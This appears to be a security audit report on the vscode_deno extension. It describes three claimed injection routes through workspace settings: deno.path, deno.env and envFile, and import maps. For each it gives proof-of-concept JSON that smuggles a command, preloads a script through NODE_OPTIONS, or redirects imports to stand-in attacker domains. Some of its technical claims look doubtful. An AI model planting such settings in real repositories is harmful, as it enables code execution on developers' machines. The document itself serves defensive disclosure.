# Vulnerabilities in vscode_deno

## 1. Command Injection through deno.path setting

### Description
The extension allows users to configure the path to the Deno executable through the `deno.path` setting. When a workspace is opened, this setting is read from workspace settings (`.vscode/settings.json`) and used to execute the Deno language server. A malicious repository could include a `.vscode/settings.json` file with a `deno.path` value containing command injection characters.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "malicious_command & deno"
   }
   ```
2. When a victim with the Deno extension opens this repository and trusts it
3. The extension reads the `deno.path` setting from workspace settings
4. The extension uses this value to start the Deno language server
5. The command `malicious_command & deno lsp` is executed, running the attacker's code

### Impact
The attacker can execute arbitrary commands with the privileges of the VSCode process on the victim's machine. This could lead to data theft, installation of malware, or complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
VSCode has a workspace trust model that prevents certain settings like executable paths from being applied in untrusted workspaces. However, once a user trusts a workspace, these settings are applied.

### Missing Mitigations
The extension should validate and sanitize the `deno.path` setting to ensure it doesn't contain shell metacharacters. Additionally, it should warn users when they are about to use a non-standard Deno executable path from workspace settings.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted by VSCode

### Source Code Analysis
The vulnerability exists in several files:

In `client/src/util.ts`, the extension gets the Deno command path from workspace settings:
```typescript
function getWorkspaceConfigDenoExePath() {
  const exePath = workspace.getConfiguration(EXTENSION_NS)
    .get<string>("path");
  // it is possible for the path to be blank. In that case, return undefined
  if (typeof exePath === "string" && exePath.trim().length === 0) {
    return undefined;
  } else {
    return exePath;
  }
}
```

In `client/src/commands.ts`, this path is used to create server options for the language client:
```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

The `command` variable comes from `getDenoCommandPath()`, which ultimately returns the value from workspace settings. This value is passed directly to the `vscode-languageclient` library, which uses Node.js's `child_process` module to execute the command. If the command contains shell metacharacters, it could lead to command injection.

### Security Test Case
1. Create a test repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "echo 'Command Injection Successful' > /tmp/vscode_deno_vulnerability && which deno"
   }
   ```
2. Install the Deno extension in VSCode
3. Open the test repository in VSCode
4. When prompted, trust the workspace
5. The extension will execute the command when starting the language server
6. Verify that a file `/tmp/vscode_deno_vulnerability` was created with the text "Command Injection Successful"

## 2. Command Injection through deno.env and deno.envFile settings

### Description
The extension allows setting environment variables for the Deno language server through the `deno.env` and `deno.envFile` settings. These environment variables are applied when executing Deno commands. A malicious repository could include environment variables that influence how commands are executed, potentially leading to command injection.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.env": {
       "NODE_OPTIONS": "--require /tmp/malicious.js"
     }
   }
   ```
   Or includes a malicious `.env` file and sets:
   ```json
   {
     "deno.envFile": "path/to/malicious.env"
   }
   ```
2. When a victim opens this repository and trusts it
3. The extension reads these settings and applies them when executing Deno commands
4. The attacker's environment variables could influence how Node.js executes commands, potentially executing malicious code

### Impact
The attacker can potentially execute arbitrary code through environment variables that influence command execution. This could lead to data theft, installation of malware, or system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
VSCode's workspace trust model provides some protection, requiring users to explicitly trust a workspace before these settings are applied.

### Missing Mitigations
The extension should validate environment variables to ensure they don't contain potentially dangerous values. It should also warn users when environment variables from workspace settings might influence code execution.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted
- The specific environment variables must be able to influence code execution in the Deno language server process

### Source Code Analysis
In `client/src/commands.ts`, the extension reads environment variables from workspace settings:
```typescript
const denoEnvFile = config.get<string>("envFile");
if (denoEnvFile) {
  if (workspaceFolder) {
    const denoEnvPath = path.join(workspaceFolder.uri.fsPath, denoEnvFile);
    try {
      const content = fs.readFileSync(denoEnvPath, { encoding: "utf8" });
      const parsed = dotenv.parse(content);
      Object.assign(env, parsed);
    } catch (error) {
      vscode.window.showErrorMessage(
        `Could not read env file "${denoEnvPath}": ${error}`,
      );
    }
  }
}
const denoEnv = config.get<Record<string, string>>("env");
if (denoEnv) {
  Object.assign(env, denoEnv);
}
```

These environment variables are then used when executing the Deno language server:
```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

Environment variables like `NODE_OPTIONS` could be used to execute arbitrary code when Node.js starts. There's no validation or sanitization of these environment variables.

### Security Test Case
1. Create a test repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.env": {
       "NODE_OPTIONS": "--require /tmp/malicious.js"
     }
   }
   ```
2. Create a file at `/tmp/malicious.js` with:
   ```javascript
   require('fs').writeFileSync('/tmp/env_injection_successful', 'Environment Variable Command Injection Test');
   ```
3. Install the Deno extension in VSCode
4. Open the test repository in VSCode and trust it
5. The extension will apply the environment variables when starting the language server
6. Verify that a file `/tmp/env_injection_successful` was created with the test message

## 3. Code Injection through Import Maps

### Description
The Deno extension allows specifying an import map through the `deno.importMap` setting. Import maps provide a way to redirect module specifiers, which could be exploited to load malicious code. When executing Deno commands, the extension passes the import map to Deno, which could lead to execution of malicious code.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.importMap": "path/to/malicious-import-map.json"
   }
   ```
2. The malicious import map redirects trusted imports to malicious code:
   ```json
   {
     "imports": {
       "trusted-module": "https://malicious-site.com/malicious-code.js"
     }
   }
   ```
3. When a victim opens this repository and trusts it
4. The victim runs a Deno command through the extension, which uses the import map
5. Imports of "trusted-module" are redirected to the attacker's malicious code
6. The malicious code is executed with the permissions granted to the Deno process

### Impact
The attacker can execute arbitrary code within the Deno runtime when the victim runs Deno commands. This could lead to accessing files, network resources, or executing system commands if the Deno process has the necessary permissions.

### Vulnerability Rank
High

### Currently Implemented Mitigations
VSCode's workspace trust model provides some protection. Additionally, Deno's security model requires explicit permissions for accessing sensitive resources, limiting the impact somewhat.

### Missing Mitigations
The extension should validate import maps to ensure they don't redirect to untrusted sources. It should also warn users when an import map from workspace settings is being used.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted
- Victim must run a Deno command that uses the import map and imports the redirected module
- The Deno command must be run with sufficient permissions for the malicious code to be effective

### Source Code Analysis
In `client/src/debug_config_provider.ts`, the extension adds the import map to Deno command arguments:
```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  const settings = this.#extensionContext.clientOptions
    .initializationOptions();
  if (settings.unstable) {
    args.push("--unstable");
  }
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  if (settings.config) {
    args.push("--config");
    args.push(settings.config.trim());
  }
  return args;
}
```

In `client/src/commands.ts`, the import map is also used for test commands:
```typescript
if (!testArgs.includes("--import-map")) {
  const importMap: string | undefined | null = config.get("importMap");
  if (importMap?.trim()) {
    testArgs.push("--import-map", importMap.trim());
  }
}
```

The import map is read from workspace settings without validation, and if it redirects trusted modules to malicious sources, it could lead to execution of malicious code.

### Security Test Case
1. Create a test repository with:
   - A `.vscode/settings.json` file:
     ```json
     {
       "deno.enable": true,
       "deno.importMap": "./import-map.json"
     }
     ```
   - An `import-map.json` file:
     ```json
     {
       "imports": {
         "std/": "https://attacker-controlled-domain.com/fake-std/"
       }
     }
     ```
   - A Deno test file `test.ts`:
     ```typescript
     import { writeFileSync } from "std/fs/mod.ts";

     Deno.test("Import Map Injection Test", () => {
       writeFileSync("/tmp/import_map_injection_successful", "Import Map Code Injection Test");
     });
     ```
2. Set up a server at `attacker-controlled-domain.com` that serves a malicious `fake-std/fs/mod.ts` file
3. Install the Deno extension in VSCode
4. Open the test repository in VSCode and trust it
5. Run the test using the Deno extension's test code lens
6. Verify that when the test imports from "std/", it gets the attacker's malicious code instead, which creates the test file
